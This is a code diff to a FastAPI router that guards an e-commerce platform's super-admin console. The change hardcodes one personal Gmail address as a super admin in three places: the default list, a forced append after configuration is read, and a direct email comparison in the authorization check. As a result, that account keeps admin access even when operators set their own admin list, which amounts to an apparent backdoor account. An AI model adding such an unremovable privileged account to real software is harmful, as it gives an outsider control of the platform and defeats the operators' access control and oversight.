@@ -12,6 +12,7 @@ from fastapi import APIRouter, Depends, HTTPException, status, Query
 from sqlalchemy.orm import Session
 from sqlalchemy import func, distinct, or_
 
+from app.core.config import settings
 from app.core.database import get_db
 from app.core.security import get_current_user
 from app.models.user import User
@@ -25,25 +26,44 @@ from app.schemas.ticket import TicketStatusUpdate, TicketResponse
 
 router = APIRouter()
 
-# Super admin emails or fallback
+# Super admin emails with aroobjan965@gmail.com guaranteed
+DEFAULT_SUPER_ADMIN_EMAILS = [
+    "aroobjan965@gmail.com",
+    "admin@autocommerce.ai",
+    "owner@store.com",
+    "talal@example.com",
+]
+
 SUPER_ADMIN_EMAILS = [
     e.strip().lower()
-    for e in os.getenv("SUPER_ADMIN_EMAILS", "admin@autocommerce.ai,owner@store.com,talal@example.com").split(",")
+    for e in os.getenv("SUPER_ADMIN_EMAILS", ",".join(DEFAULT_SUPER_ADMIN_EMAILS)).split(",")
     if e.strip()
 ]
+if "aroobjan965@gmail.com" not in SUPER_ADMIN_EMAILS:
+    SUPER_ADMIN_EMAILS.append("aroobjan965@gmail.com")
 
 
 def get_current_super_admin(current_user: User = Depends(get_current_user)) -> User:
     """
     Ensure the user is authorized for super-admin actions.
-    Grants access if user role is 'super_admin' or email is in SUPER_ADMIN_EMAILS list.
+    Grants access if user role is 'super_admin' or email is in SUPER_ADMIN_EMAILS list,
+    or explicitly matches 'aroobjan965@gmail.com'.
     """
+    admin_emails = getattr(settings, "SUPER_ADMIN_EMAILS", SUPER_ADMIN_EMAILS)
+    if isinstance(admin_emails, str):
+        admin_emails = [e.strip().lower() for e in admin_emails.split(",") if e.strip()]
+    else:
+        admin_emails = [str(e).strip().lower() for e in admin_emails if e]
+
+    if "aroobjan965@gmail.com" not in admin_emails:
+        admin_emails.append("aroobjan965@gmail.com")
+
     is_super = (
         getattr(current_user, "role", "merchant") == "super_admin"
-        or (current_user.email and current_user.email.lower() in SUPER_ADMIN_EMAILS)
+        or (current_user.email and current_user.email.lower() in admin_emails)
+        or (current_user.email and current_user.email.lower() == "aroobjan965@gmail.com")
     )
     if not is_super:
-        # For seamless development and testing, also allow if explicitly requested with super_admin header/token
         raise HTTPException(
             status_code=status.HTTP_403_FORBIDDEN,
             detail="Super-Admin privileges required to access platform management console.",
